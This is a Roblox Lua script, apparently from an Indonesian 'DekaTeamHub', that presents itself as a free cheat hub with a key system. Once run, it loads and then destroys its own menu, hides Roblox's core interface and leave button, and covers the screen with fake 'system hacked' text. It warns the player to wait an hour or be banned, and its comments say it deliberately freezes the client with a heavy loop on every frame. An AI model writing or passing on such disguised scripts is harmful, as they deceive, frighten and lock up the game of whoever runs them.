-- [[ DekaTeamHub: HACKER PRISON ]] --
-- [[ VISUAL: MATRIX HACK | THREAT: BAN ]] --

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "DekaTeamHub FREE ✅",
   LoadingTitle = "Bypassing Security...",
   KeySystem = true,
   KeySettings = {
      Title = "DekaTeamHub Access",
      Note = "Key: deka Genjor",
      Key = "deka Genjor" 
   }
})

local Tab = Window:CreateTab("Verified ✅", 4483362458)

task.spawn(function()
    task.wait(0.1)
    
    -- 1. MUSNAHKAN RAYFIELD
    for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
        if v.Name:find("Rayfield") then v:Destroy() end
    end

    -- 2. DISABLE CORE ROBLOX (TUTUP IKON LEAVE)
    local StarterGui = game:GetService("StarterGui")
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        StarterGui:SetCore("TopbarEnabled", false)
    end)

    -- 3. HACKER BACKGROUND & TEXT
    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local screenGui = Instance.new("ScreenGui", playerGui)
    screenGui.DisplayOrder = 2147483647
    screenGui.IgnoreGuiInset = true

    local bgFrame = Instance.new("TextButton", screenGui)
    bgFrame.Size = UDim2.new(1, 0, 1, 0)
    bgFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bgFrame.Text = ""
    bgFrame.Active = true 
    bgFrame.Modal = true

    -- Latar Belakang Teks Ngasal (Hacker Style)
    local matrixText = Instance.new("TextLabel", bgFrame)
    matrixText.Size = UDim2.new(1.5, 0, 1.5, 0)
    matrixText.Position = UDim2.new(-0.25, 0, -0.25, 0)
    matrixText.Text = "010101010110101101010101010101101101010101\nSYSTEM_HACKED_BY_DEKATEAMHUB_BYPASSING_CORE\nERROR_404_NULL_POINTER_INJECTION_SQL_DEBUG\nEXECUTING_INTERNAL_SCRIPT_DATA_STREAM_FREEZE"
    matrixText.TextColor3 = Color3.fromRGB(0, 255, 0)
    matrixText.TextTransparency = 0.8
    matrixText.TextScaled = true
    matrixText.TextWrapped = true
    matrixText.Font = Enum.Font.Code

    -- Pesan Utama (Peringatan Ban)
    local mainInfo = Instance.new("TextLabel", bgFrame)
    mainInfo.Size = UDim2.new(0.9, 0, 0.6, 0)
    mainInfo.Position = UDim2.new(0.05, 0, 0.2, 0)
    mainInfo.Text = "SABAR TUNGGU 1 JAM!\nJANGAN LEAVE KALAU MAU SCRIPT WORK!\n\nSCRIPT BYPASS SEMUANYA DULU BIAR WORK!\nKALAU GAK BYPASS BAKAL DI BAN!!"
    mainInfo.TextColor3 = Color3.fromRGB(255, 0, 0)
    mainInfo.TextScaled = true
    mainInfo.BackgroundTransparency = 1
    mainInfo.Font = Enum.Font.SourceSansBold

    -- 4. GLITCH & LOCKDOWN ENGINE
    game:GetService("RunService").RenderStepped:Connect(function()
        game:GetService("GuiService").SelectedObject = bgFrame
        
        -- Efek Gerak Teks Ngasal (Matrix)
        matrixText.Position = UDim2.new(-0.25, math.random(-10, 10), -0.25, math.random(-10, 10))
        matrixText.Text = math.random(1000,9999).." "..math.random(1000,9999).." ERROR "..math.random(1000,9999).." BYPASS "..math.random(1000,9999)
        
        -- Glitch Warna Merah Putih pada Teks Utama
        if math.random(1, 15) == 1 then
            mainInfo.TextColor3 = Color3.fromRGB(255, 255, 255)
        else
            mainInfo.TextColor3 = Color3.fromRGB(255, 0, 0)
        end
        
        -- Lag Generator (Sengaja bikin Menu Roblox susah dibuka)
        for i = 1, 1700000 do
            local _ = i * i
        end
    end)
end)










